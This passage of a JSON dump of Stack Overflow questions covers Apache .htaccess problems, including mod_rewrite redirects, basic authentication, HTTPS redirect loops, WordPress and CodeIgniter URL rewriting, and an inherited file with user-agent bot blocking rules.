httpasswd successfuly (user primoz). I've put .htaccess in /var/www/ and this is the content:</p>\n\n<pre><code>AuthType Basic\nAuthName \"RestrictedFiles\"\nAuthBasicProvider file\nAuthUserFile /etc/apache2/passwords\nRequire user primoz\n</code></pre>\n\n<p>My website is still accessible.\nI also tried editing the /etc/apache2/sites-enabled/000-default - line <em>AllowOverride None</em> to <em>AllowOverride All</em>. No need to mention that it didn't make any changes.</p>\n\n<p>Should restricting really be this frustrating?</p>\n\n<p><strong>EDIT:</strong>\n<em>/etc/apache2/httpd.conf</em> is empty by default because I run server on Debian - which uses apache2.conf instead.</p>\n\n<p><a href=\"http://paste.ubuntu.com/1302921/\" rel=\"nofollow\">Here</a> is the whole apache2.conf.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13051595,"title":"Set env based on query string using .htaccess","body":"<p>I am trying to set an Env variable in htaccess using rewrite based on the query string. I want to set ENVIRONMENT to mobile if mobile=true in the query string </p>\n\n<p>So far I have tried a few things but am stuck with this rule which I think should work but sadly is not working...</p>\n\n<pre><code>   RewriteCond %{QUERY_STRING} !^mobile=true$\n   RewriteRule .* - [E=ENVIRONMENT:mobile]\n</code></pre>\n\n<p>Any help appreciated!</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13045650,"title":"Redirecting Addon domain | maindomain.com/addon.com to www.addon.com","body":"<p>I need to redirect my domain all the following <strong>addon.com</strong> to <strong>www.addon.com</strong>. I manage to accomplish the first two tasks but don't how to do the third one. I am using wordpress installtion on both <strong>addon</strong> and <strong>maindomain</strong>.</p>\n\n<pre><code>AddOn Domain: addon.com (Done)\nSubdomain: addon.maindomain.com (Done)\nSubfolder: maindomain.com/addon.com (Not Done)\n</code></pre>\n"},{"tags":["apache",".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13052161,"title":"URL re-writing rule to make url case insensitive","body":"<p>I'm trying to get the following URLs be case insensitive and to go to same spot: </p>\n\n<p><a href=\"http://www.mywebsite.com/test\" rel=\"nofollow\">http://www.mywebsite.com/test</a></p>\n\n<p><a href=\"http://www.mywebsite.com/TEST\" rel=\"nofollow\">http://www.mywebsite.com/TEST</a></p>\n\n<p>I have the following rule:</p>\n\n<pre><code>RewriteRule ^/([a-zA-Z0-9_\\-]+)/?$ /?param=$1 [L]\n</code></pre>\n\n<p>It works for lowercase but when I have 'TEST' after website name, it doesn't apply.</p>\n\n<p>I get <code>The requested URL /TEST.php was not found on this server</code>.  Appending .php is another URL rule that comes after the rule above. So it looks like, it doesn't match the rule and goes on to next.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13050120,"title":"a test site using htaccess help needed","body":"<p>I have my website at root website .com/ I want to setup a folder like this website .com/us/</p>\n\n<p>The folder /us/ is empty and when someone goes to it the folder shows the same content as what's in website .com but still staying on website .com/us/.</p>\n\n<p>Here's the twist, if i wanted to show a different header.php or js or css file and this is loaded in to the domain website .com/us/, i need htaccess to use that instead of what's on website .com/. I will use the same directory structure.</p>\n"},{"tags":["php",".htaccess","codeigniter","redirect","expressionengine"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":235,"score":0,"question_id":11759543,"title":"php / expression engine - redirect all URLs from one URL segment to another URL segment","body":"<p>I have an expression engine site that I recently redid and, while the titles of each article or page on the site did not change, the routes to them did. So, for example, where before I had:</p>\n\n<p>site.com/site/code_single/name-of-page</p>\n\n<p>I now have</p>\n\n<p>site.com/main/code-item/name-of-page</p>\n\n<p>How would I set up a redirect (either with expression engine tags or with PHP / .htaccess) so that all URLS matching site/code_single got redirected to their corresponding titles in site/main/code-item?</p>\n"},{"tags":[".htaccess","expressionengine"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":11924836,"title":"Removing index.php from some ExpressionEngine 2 paths","body":"<p>I set up ExpressionEngine 2.4 with clean urls per the <a href=\"http://expressionengine.com/user_guide/general/remove_index.php.html\" rel=\"nofollow\">User Guide instructions</a>. They work great. But when I use path single variables from, say the <a href=\"http://expressionengine.com/user_guide/modules/channel/channel_entries.html\" rel=\"nofollow\">channel entries tag</a>, I still get \"index.php\" in the path. For example:</p>\n\n<pre class=\"lang-php prettyprint-override\"><code>{exp:channel:entries channel=\"news\"}\n  ..\n  &lt;a href=\"{comment_url_title_auto_path}\"&gt;Test&lt;/a&gt;\n{/exp:channel:entries}\n</code></pre>\n\n<p>Renders to:</p>\n\n<pre class=\"lang-html prettyprint-override\"><code>&lt;a href=\"http://eetest/index.php/mothra-is-attacking\"&gt;Test&lt;/a&gt;\n</code></pre>\n\n<p>I currently have a workaround consisting of two parts:</p>\n\n<p>First, I scrub the \"index.php\" from the url using the <a href=\"http://devot-ee.com/add-ons/find-and-replace-plus\" rel=\"nofollow\">Find and Replace Plus</a> plugin:</p>\n\n<pre class=\"lang-php prettyprint-override\"><code>{exp:channel:entries channel=\"news\" limit=\"1\"} \n    &lt;a href=\"{exp:replace_plus find=\"index.php/\"}\n             {comment_url_title_auto_path}\n           {/exp:replace_plus}\"&gt;Test&lt;/a&gt;\n{/exp:channel:entries}\n</code></pre>\n\n<p>Which gives me the working clean url:</p>\n\n<pre class=\"lang-html prettyprint-override\"><code>&lt;a href=\"http://eetest/mothra-is-attacking\"&gt;Test&lt;/a&gt;\n</code></pre>\n\n<p>Second, in case I ever miss a url in the templates,  I make sure that any url that has \"index.php\" in it is redirected to ones that don't have one. In my .htaccess I use this clause:</p>\n\n<pre><code># Redirect index.php Requests\n# ------------------------------\nRewriteCond %{THE_REQUEST} ^[^/]*/index\\.php [NC]\nRewriteCond %{THE_REQUEST} ^GET\nRewriteRule ^index\\.php(.+) $1 [R=301,L] \n</code></pre>\n\n<p>So while this setup works it's cluttered (makes me sprinkle find/replace on my links in my templates) and a bit inefficient (forces redirects in some cases), and it's not completely SEO friendly (for those urls that render with index.php).</p>\n\n<p>My question is, is there some setting I'm missing to prevent index.php from showing up in some of these paths in the first place?</p>\n\n<p>Here are some relevant settings in my config.php:</p>\n\n<pre class=\"lang-php prettyprint-override\"><code>$config['index_page'] = ''; //per the user docs on removing index.php\n$config['uri_protocol'] = 'AUTO'; //didn't have luck with the other values\n$config['base_url'] = '';\n$config['url_suffix'] = '';\n</code></pre>\n"},{"tags":["apache",".htaccess","webserver"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":58,"score":-1,"question_id":13048014,"title":".htaccess file explanation and fix","body":"<p>Please would anyone be so kind to tell me what all this does and if its <strong>properly configured?</strong> </p>\n\n<p><em>My website administrator left me with this and I have trouble understanding this code.</em></p>\n\n<p>Just if someone could tell me <strong>if all is fine</strong> with it or <em>what changes need to be made</em>.</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^MYWEB.com [NC]\nRewriteRule ^(.*)$ http://www.MYWEB.com/$1 [L,R=301]\n</code></pre>\n\n<p>What this means?</p>\n\n<pre><code>AddEncoding gzip .gz\n</code></pre>\n\n<p>Is this ok?</p>\n\n<pre><code>RewriteCond %{HTTP:Accept-encoding} gzip\nRewriteCond %{HTTP_USER_AGENT} !Safari\nRewriteCond %{REQUEST_FILENAME}.gz -f\nRewriteRule ^(.*)$ $1.gz [QSA,L]\nRewriteRule adminarea.php adminarea.php$1\n</code></pre>\n\n<p>What this lines do exactly?</p>\n\n<pre><code>RewriteBase /\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /index\\.php\\ HTTP/\nRewriteRule ^index\\.php$ http://www.MYWEB.com/ [R=301,L]\n</code></pre>\n\n<p>This should point index.php to the root domain (http://www.MYWEB.com/index.php will go to <a href=\"http://www.MYWEB.com\" rel=\"nofollow\">http://www.MYWEB.com</a>) right?</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^(ns1\\.)?MYWEB\\.com [NC]\nRewriteRule ^(.*)$ http://www.MYWEB.com/$1 [L,R=301]\nRewriteCond %{HTTP_HOST} ^(ns2\\.)?MYWEB\\.com [NC]\nRewriteRule ^(.*)$ http://www.MYWEB.com/$1 [L,R=301]\nRewriteCond %{HTTP_HOST} ^(ns3\\.)?MYWEB\\.com [NC]\nRewriteRule ^(.*)$ http://www.MYWEB.com/$1 [L,R=301]\nRewriteCond %{HTTP_HOST} ^(ns4\\.)?MYWEB\\.com [NC]\nRewriteRule ^(.*)$ http://www.MYWEB.com/$1 [L,R=301]\n</code></pre>\n\n<p>This i suppose is for nameservers.</p>\n\n<pre><code>RewriteCond %{HTTP_USER_AGENT} ^Anarchie [OR]\nRewriteCond %{HTTP_USER_AGENT} ^ASPSeek [OR]\nRewriteCond %{HTTP_USER_AGENT} ^attach [OR]\nRewriteCond %{HTTP_USER_AGENT} ^autoemailspider [OR]\nRewriteCond %{HTTP_USER_AGENT} ^Xaldon\\ WebSpider [OR]\nRewriteCond %{HTTP_USER_AGENT} ^Xenu [OR]\nRewriteCond %{HTTP_USER_AGENT} ^Zeus.*Webster [OR]\nRewriteCond %{HTTP_USER_AGENT} ^Zeus\nRewriteRule ^.* - [F,L]\n</code></pre>\n\n<p>What are those bots? Is this properly configured?</p>\n\n<pre><code>RewriteCond %{HTTP_USER_AGENT} (Crawler|spider) [NC]\nRewriteRule .* - [L]\n</code></pre>\n\n<p>What kind of bots does this catch?</p>\n\n<pre><code>SetEnvIf User-Agent ^libww keep_out=1\nSetEnvIf User-Agent ^Morf keep_out2=1\nSetEnvIf User-Agent ^TurnitinBot keep_out3=1\nDeny from env=keep_out env=keep_out2 env=keep_out3\n\nSetEnvIfNoCase User-Agent \"^Wget\" bad_bot\nSetEnvIfNoCase User-Agent \"^EmailSiphon\" bad_bot\nSetEnvIfNoCase User-Agent \"^EmailWolf\" bad_bot\nSetEnvIfNoCase User-Agent \"^libwww-perl\" bad_bot\n#SetEnvIfNoCase User-Agent \"libwww\" bad_bot\nSetEnvIfNoCase User-Agent \"TurnitinBot\" bad_bot\nSetEnvIfNoCase User-Agent \"tencenttraveler\" bad_bot\nSetEnvIfNoCase User-Agent \"Yandex\" bad_bot\nSetEnvIfNoCase User-Agent \"baidu\" bad_bot\nSetEnvIfNoCase User-Agent \"zeus\" bad_bot\nSetEnvIfNoCase User-Agent \"getright\" bad_bot\nSetEnvIfNoCase User-Agent \"flipboard\" bad_bot\nSetEnvIfNoCase User-Agent \"mj12\" bad_bot\nSetEnvIfNoCase User-Agent \"majestic\" bad_bot\nOrder allow,deny\nAllow from all\nDeny from env=bad_bot\n</code></pre>\n\n<p>Are really all those bad bots? And is it properly configured?</p>\n\n<p>I edited this question to be more specific on what help i need. To see my full .htaccess file please see <strong>original version of this question</strong>!</p>\n\n<p>Thank you!</p>\n"},{"tags":[".htaccess","mod-rewrite","apache2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":467,"score":0,"question_id":7911652,"title":"Map files in sub directory to root folder via .htaccess","body":"<p>I have a large number of files in a sub directory.  I would like to map these files to the root directory such that the request for \"http://www.mysite.com/filename\" actually points to \"http://www.mysite.com/subfolder/filename.php\" on the server.  I would like to remove the reference to the sub-folder.</p>\n\n<p>Note that I'd like to append the \"php\" suffix in the htaccess file as well.  I also have a relatively large number of files in the root directory (including About, Contact, etc.) and a couple other folders so Rewrite Base is not a viable option.</p>\n\n<p>Ideally, for each request, I would to test whether or not the file exists in the root folder, and if not, then map to the subfolder. I tried the following but could not map a file to a subfolder, let alone check if it exists first.  </p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\n# works fine if not commented:\n# RewriteRule ^(.*)$ $1.php\n# try pointing to subfolder instead does not work\nRewriteRule ^(.*)$ folder/$1.php\n</code></pre>\n\n<p>Thanks for any advice.  Plan B is to simply leave the folder name in the URL but I would be thrilled to find a more elegant solution and a shorter, more direct URL.</p>\n"},{"tags":[".htaccess","mod-rewrite","joomla","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13039232,"title":"how can i hide the part of url using .htaccess","body":"<p>I am trying to remove the part from my url here is the url <strong>\"http://example.com/custom_joomla_template-2.5.6/about-us/portfolio/itemlist/category/3-category-2\"</strong></p>\n\n<p>Now I want to remove \"itemlist/category/\" from the url so that url can be look link <strong>\"http://example.com/custom_joomla_template-2.5.6/about-us/portfolio/3-category-2\"</strong></p>\n\n<p>I am using default functionality of joomla i.e. SEF urls, I need to simplify it more I am new for the htaccess </p>\n\n<p>Please suggest link for learning how to write rules for .htaccess file</p>\n\n<p>Please help </p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":13047421,"title":"Using .htaccess to redirect non www to www including period after .co.uk","body":"<p>I have the following rewrite rule in my htaccess file, which I found suggested on a website (which I can no longer remember).</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\nRewriteCond %{HTTP_HOST} !^(www.example.co.uk)?$ [NC]\nRewriteRule (.*) http://www.example.co.uk/$1 [R=301,L]\n</code></pre>\n\n<p>I was testing the combinations to see how the redirect worked and these are the results</p>\n\n<pre><code>example.co.uk/foo/bar.html to www.example.co.uk/foo/bar.html\nexample.co.uk./foo/bar.html to www.example.co.uk/foo/bar.html\nexample.co.uk:80/foo/bar.html to www.example.co.uk/foo/bar.html\nexample.co.uk/ to www.example.co.uk\nexample.co.uk./ to www.example.co.uk\nexample.co.uk:80/ to www.example.co.uk\nexample.co.uk to www.example.co.uk\nexample.co.uk:80 to www.example.co.uk\n</code></pre>\n\n<p>The only one that failed to work was <strong><code>example.co.uk. to example.co.uk.</code></strong></p>\n\n<p>I am not sure how to change this condition to work with this this single scenario and would appreciate some pointers.</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":89,"score":2,"question_id":10484894,"title":"Blacklist all, then whitelist public files","body":"<p>I know this could probably be solved in a second if I had access to server config, but unfortunately I don't, so I have to solve this with only .htaccess.</p>\n\n<p>I'm building a site MVC-style, meaning I have my index.php in the root, models in a models-directory,  views in a views-directory, etc. The thing is, I have some folders that should be public, like css, javascript and images. As I'm quite forgetful, I prefer blacklisting everything, then whitelisting only the things I want to be public (I rather get an error the first time I try to access an image because I forgot to whitelist it, than forget to blacklist my config-directory and have all sorts of sensitive stuff be available).</p>\n\n<p>My .htaccess-file in root currently looks like this:</p>\n\n<pre><code>&lt;filesMatch \"\\..+$\"&gt;\n    deny from all\n&lt;/FilesMatch&gt;\n\n&lt;filesMatch \"^index\\.(htm|html|shtml|wml|pwml|php|php3|php4|php5)$\"&gt;\n    allow from all\n&lt;/filesMatch&gt;\n\n&lt;Files \"tests.php\"&gt;\n    allow from 127.0.0.1\n&lt;/files&gt;\n</code></pre>\n\n<p>The issue I have is that I cannot figure out how to allow access to the subdirectories. Location and Directory seems to be what should be used, but for some reason these aren't allowed in .htaccess, only server config, and since I don't have access to it, it becomes problematic. Are there any other ways to solve this that I haven't thought of?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13036542,"title":".htaccess rewrite folder-like url to existing html page","body":"<p>My local project's root is <strong>localhost/website</strong></p>\n\n<p>I created the file localhost/website/.htaccess with the following contents:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^content/(.*)$ content/$1.html [L]\n</code></pre>\n\n<p>What I exactly want to achieve:\n<strong>localhost/website/main</strong> -> <strong>localhost/website/content/main.html</strong>\nwhere <strong>localhost/website/content/main.html</strong> actually does exist.</p>\n\n<p>I tried several rules but none of them worked for me. Somehow I think I'm missing something.</p>\n"},{"tags":[".htaccess","http","redirect","https","indefinite"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":14,"score":2,"question_id":13047350,"title":"htaccess throwing indefinite redirects","body":"<p>Am trying to have my page redirected to the https using htaccess. At the same time I want that other pages should work on http. Following is my .htaccess code.</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteBase /\n\n# Turn SSL on for index.php\nRewriteCond %{SERVER_PORT} !^443$\nRewriteCond %{REQUEST_URI} \\/trimmApp\\/index\\.php [NC]\nRewriteRule ^(.*)$ https://%{HTTP_HOST}/$1 [L]\n\n# Turn SSL off everything exluding index.php (and some files used on index.php that need to serve through https only)\n\nRewriteCond %{SERVER_PORT} !^443$\nRewriteCond %{REQUEST_URI} !\\/trimmApp\\/index\\.php [NC]\nRewriteRule ^(.*)$ http://%{HTTP_HOST}/$1 [L]\n</code></pre>\n\n<p>Http to https redirection happens fine, however, htpps redirects to another <a href=\"https://index.php\" rel=\"nofollow\">https://index.php</a> and this happens indefinitely. I tried almost everything possible wrt httpd.cong AllowOveride settings, </p>\n\n<p>following is snapshot of my rewrite log:</p>\n\n<pre><code>10.x.x.x - - [24/Oct/2012:06:17:21 --0400] [xyz.com/sid#2b0c835afd70][rid#2b0c83a4cb90/initial] (4) [perdir /var/www/] RewriteCond: input='80' pattern='!^443$' =&gt; matched\n10.x.x.x - - [24/Oct/2012:06:17:21 --0400] [xyz.com/sid#2b0c835afd70][rid#2b0c83a4cb90/initial] (4) [perdir /var/www/] RewriteCond: input='/check/ping.html' pattern='\\/trimmApp\\/index\\.php' [NC] =&gt; not-matched\n10.x.x.x - - [24/Oct/2012:06:17:21 --0400] [xyz.com/sid#2b0c835afd70][rid#2b0c83a4cb90/initial] (3) [perdir /var/www/] strip per-dir prefix: /var/www/check/ping.html -&gt; check/ping.html\n10.x.x.x - - [24/Oct/2012:06:17:21 --0400] [xyz.com/sid#2b0c835afd70][rid#2b0c83a4cb90/initial] (3) [perdir /var/www/] applying pattern '^(.*)$' to uri 'check/ping.html'\n10.x.x.x - - [24/Oct/2012:06:17:21 --0400] [xyz.com/sid#2b0c835afd70][rid#2b0c83a4cb90/initial] (4) [perdir /var/www/] RewriteCond: input='80' pattern='=443' =&gt; not-matched\n10.x.x.x - - [24/Oct/2012:06:17:21 --0400] [xyz.com/sid#2b0c835afd70]\n</code></pre>\n\n<p>Not sure what must be happening. Help would be really appreciated. My linux version is Centos 5.6</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13044572,"title":"Change directory index based on domain url?","body":"<p>In a 3 domain structure, for example main.com eng.com and esp.com\nAll share the same files but the html content is in different languages.\nInstead of replicating and maintaining 3 set of files, i would like to handle the domains in the same application folder, with 3 \"index\" files.\nThe user will go to /en.html or /es.html depending of the domain, its just for the domain root.\nIs like a conditional directory index.</p>\n\n<p>Is this possible? I was thinking of something like (where main.com still uses /index.html):</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{HTTP_HOST} ^eng\\.com$ [NC]\nRewriteRule ^/$ http://eng.com/en.html [R,L]\n\nRewriteCond %{HTTP_HOST} ^esp\\.com$ [NC]\nRewriteRule ^/$ http://esp.com/es.html [R,L]\n</code></pre>\n"},{"tags":["apache",".htaccess","webserver"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":6876210,"title":"Does Mod_Rewrite support Named Capturing Groups","body":"<p>Does <code>mod_rewrite</code> support <a href=\"http://www.regular-expressions.info/named.html\" rel=\"nofollow\">Named Capturing Groups</a>? Please support your reply with an example if it does</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13043740,"title":"HTACCESS.. Restrict acces xml file from out","body":"<p>I have xml file. i use it as db. how can i restrict access to this file..\ni checked more than one option its worked but owner (website) also cant access this xml file..</p>\n\n<p>How can i restrict acces this file from outside but the website can use this xml..</p>\n\n<p>i`ve checked </p>\n\n<pre><code>chmod 700\n</code></pre>\n\n<p>and</p>\n\n<pre><code>ErrorDocument ### index.php -- Example of format \nErrorDocument 404 /index.php -- Working example\nphp_flag display_startup_errors off\nphp_flag display_errors off\nphp_flag html_errors off\nRewriteCond %{HTTP_REFERER} !^http://(www\\.)?site\\.com(.+) [NC]\nRewriteRule .*\\.(xml)$ - [F]\n</code></pre>\n"},{"tags":["php",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":13042986,"title":"URL Rewriting in codeigniter rewrite the URL for next page after login","body":"<p>I'm having a hardtime on this part. Well I created a login page using codeigniter wherein the whole path would be <code>http://localhost/CodeIgniter_2.1.3/index.php</code> will be rewritten into <code>http://localhost/login</code> using .htaccess. Well it works just fine but the problem is after I made a successful login and the page redirects to next page using redirect('next_page'); since the URL would be <code>http://localhost/CodeIgniter_2.1.3/index.php/next_page</code> instead of <code>http://localhost/next_page</code>. I also created a rewriterule for that part :</p>\n\n<pre><code>RewriteRule ^events$ /CodeIgniter_2.1.3/index.php/events [L,NC]\n</code></pre>\n\n<p>and whenever I key in the <code>http://localhost/next_page</code> in the addressbar the page would appear just fine (since I haven't applied any rules on login and on this page.) I also tried using redirect('http://localhost/events'); this also works just fine but still I know this is not the real solution for this. Oh by the way my .htaccess exists on the www folder of wampserver. Any way to solve this?</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13039007,"title":"Rewite a url with htaccess","body":"<p>I am completely new to ht-access and I am not sure that this is the correct way to do this.\nOn my WordPress site, I have the current url:\n<a href=\"http://www.example.com/category/travel/\" rel=\"nofollow\">http://www.example.com/category/travel/</a></p>\n\n<p>And would like to map this to:\n<a href=\"http://www.example.com/kids-vaction-spots/\" rel=\"nofollow\">http://www.example.com/kids-vaction-spots/</a></p>\n\n<p>So any post under the category travel would look like:\nwww.example.com/kids-vaction-spots/beach-holidays</p>\n\n<p>Is it possible to have a rule in the htaccess that does this?</p>\n\n<p>Thank you for taking the time to look at this.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13038557,"title":"how to remove %u from url using htaccess","body":"<p>I'm getting bad request(error message below) from browser for an url</p>\n\n<p>Bad Request</p>\n\n<p>Your browser sent a request that this server could not understand.\nClient sent malformed Host header</p>\n\n<p>Finally I realized that there is a special character \"%u\" on it.  How can I remove the special character using .htaccess?</p>\n\n<p>For e.g I want to change the URL from </p>\n\n<p><a href=\"http://www.example.com/property-listings/A/B/C/D/E/F-%uG/H/I-101.html\" rel=\"nofollow\">http://www.example.com/property-listings/A/B/C/D/E/F-%uG/H/I-101.html</a></p>\n\n<p>TO</p>\n\n<p><a href=\"http://www.example.com/property-listings/A/B/C/D/E/F-G/H/I-101.html\" rel=\"nofollow\">http://www.example.com/property-listings/A/B/C/D/E/F-G/H/I-101.html</a></p>\n\n<p>Any thoughts.</p>\n\n<p>regards,</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":13026589,"title":"Complex htaccess rewrite for variable url","body":"<p>I have a shopping cart which has SEO links, i'm creating a option to refine the search option within the results displayed.</p>\n\n<p>This is an example of what i am trying to achieve</p>\n\n<p>Customer display a list of products\nwww.example.com/products/Drives-Bluray/view/list/category_id/30/sub_category/167</p>\n\n<p>Then if customer want to search by manufacturer as well\nwww.example.com/products/Drives-Bluray/view/list/category_id/30/sub_category/167?manufacturer=LG</p>\n\n<p>or if customer wants to order by manufacturer and price</p>\n\n<p>www.example.com/products/Drives-Bluray/view/list/category_id/30/sub_category/167?manufacturer=LG&amp;orderby=price</p>\n\n<p>In my htaccess I currently have;</p>\n\n<pre><code>RewriteRule view/([a-z]+)/category_id/([0-9]+)/sub_category/([0-9]+)$ com_products.php?view=$1&amp;category_id=$2&amp;sub_category=$3 [L]\n</code></pre>\n\n<p>I've searched and can't seem to figure out how to have multiple variables, which may or may not be there using RewriteCond.</p>\n\n<p>Can someone please give an example on the way forward with this?</p>\n\n<p>Thanks</p>\n\n<p>Jay</p>\n"},{"tags":["php",".htaccess","zend-framework","include"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":13041329,"title":"Modifying .htaccess file to set include path to ZendFramework","body":"<p>I'm trying to include ZendFramework on a web site with no luck. Lately I gave a try at modifying the .htaccess file like this: </p>\n\n<pre><code>php_value include_path \":/home/u230474/Zend\"\n</code></pre>\n\n<p>I also tried </p>\n\n<pre><code>php_value include_path \".:/home/u230474/Zend\"\n</code></pre>\n\n<p>But on each case what happened was that I no longer could view any of the pages in the web site. </p>\n\n<p>I did these modifications since I'm trying to make the system understand the following code: </p>\n\n<pre><code>&lt;?php \n$libreria='/Zend/ZendFramework/library';\nset_include_path(get_include_path().PATH_SEPARATOR.$libreria);\nrequire_once('Zend/Loader/Autoloader.php');\nZend_Loader_Autoloader::getInstance(); \n</code></pre>\n\n<p>I've been trying things many days long now, and although I've talked to my provided we seem to have problems understanding the requirements. </p>\n\n<p>I did a test to check the installation of ZendFramework with a script called InstallationChecker.php which is supposed to indicate the success in installing Zend Framework, and actually the script throws an error like this: </p>\n\n<pre><code>Exception thrown trying to access Zend/Loader.php using 'use_include_path' = true. Make sure you include Zend Framework in your include_path which currently contains: .:/usr/lib/php:/usr/local/lib/php\n</code></pre>\n\n<p>Which is why I tried modifying .htaccess</p>\n\n<p>Does anyone know if I'm doing things wrong (obviously yes)? What is the right way to modify the htaccess file so that `/usr/lib/php and /usr/local/lib/php are included as well?</p>\n\n<p>Also I've read that when you include a htaccess you must include also a .htaccess file to every subdirectory that makes an include. Most of my php scripts are directly in the public folder, but still I have many of them on subdirectories as well. How am I supposed to proceed?</p>\n\n<p>I made some changes following Mike's advise and included the whole custom path like this: </p>\n\n<pre><code>$libreria='Zend/ZendFramework/library/Zend/Loader';\n</code></pre>\n\n<p>then I looked at php.info and it still doesn't show any changes to include_path. Additionally, I noticed that the error in the test I'm running to check if ZendFramework is installed is telling me there's a class Loader.php in the Zend folder, which is actually there, but still nothing gets loaded.</p>\n\n<p>Ok so I did a couple of test to see what's going wrong, since the Zend Framework seems to load ok. First I added this code to the file 'libreria.php' which sets the include path (apparently alright, since the library is loaded). I did this: </p>\n\n<pre><code>$libreria='/home/u230474/public_classes/Zend/ZendFramework/library';\nset_include_path(get_include_path().PATH_SEPARATOR.$libreria);\nrequire_once('Zend/Loader/Autoloader.php');\n$libload = Zend_Loader_Autoloader::getInstance();\nif(!$libload) echo \"Librer&amp;iacute;a Zend Framework cargada\"; else echo \"Error al cargar la librer&amp;iacute;a\";\n</code></pre>\n\n<p>And as a result, it outputs: \"Error al cargar la librería\".</p>\n\n<p>I also set up a tiny test to see if there's something wrong with the case sensitivity. On some of the pages that are having trouble, I put this code inmediately after including the header and the library: </p>\n\n<pre><code>//codigo para probar equidad de nombre de archivo----------&gt;\n$filename = basename($_SERVER['SCRIPT_FILENAME']);\n$request = basename($_SERVER['SCRIPT_NAME']);\nif($filename != $request)\n  die('Case of filename and request do not match!');\n</code></pre>\n\n<p>And it does not die, so it's ok. (If I get it right the result would be different if there was a slight difference in my file names, as are seen on the browser address, and as are seen by the server, but maybe I'm wrong). </p>\n\n<p>Then, there's something going on with the way I call the Autoloader.php class, but I don't see a different way of calling it than the static method on Zend's introduction to Autoloader documentation, where it says 'Autoloader, basic usage'</p>\n"},{"tags":["wordpress",".htaccess","wordpress-mu"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13033958,"title":"Wordpress Multisite installation-generated .htaccess fails","body":"<p>My first (fresh) Wordpress installation and its a multisite one. Everything went smoothly until Wordpress installation process generated the following code to put in a .htaccess file:</p>\n\n<pre><code>    RewriteEngine On\n    RewriteBase /\n    RewriteRule ^index\\.php$ - [L]\n\n    # uploaded files\n    RewriteRule ^files/(.+) wp-includes/ms-files.php?file=$1 [L]\n\n    RewriteCond %{REQUEST_FILENAME} -f [OR]\n    RewriteCond %{REQUEST_FILENAME} -d\n    RewriteRule ^ - [L]\n    RewriteRule . index.php [L]\n</code></pre>\n\n<p>Which promptly made the entire site unusable by presenting me with a 403 Forbidden error. Now as far as I can tell everything should be ok with proper directories and file permissions. Plus I installed it into root, etc.</p>\n\n<p>I've been hunting for a solution on Google and found that (for this particular problem) some hosts might require wrapping the entire .htaccess in:</p>\n\n<pre><code>    &lt;IfModule mod_rewrite.so&gt;\n    ...\n    &lt;/IfModule&gt;\n</code></pre>\n\n<p>Which now works on the root index (index.php) and shows the site, but fails as soon as I click any of the test posts (change the address).</p>\n\n<p>So I guess I'm stuck and any help would be greatly appreciated!</p>\n"},{"tags":[".htaccess","subdomains"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13037535,"title":"How to change.htaccess to allow access to multiple pages","body":"<p>I took over a hosting account for a friend to host a second domain on his server.  All is good, except for the .htaccess file that was generated by whoever designed his first site.</p>\n\n<p>The main site is: ra-pictures.com, hosted in the root folder /</p>\n\n<p>The site I'm working on is posthumanmovie.com, which is hosted in the folder 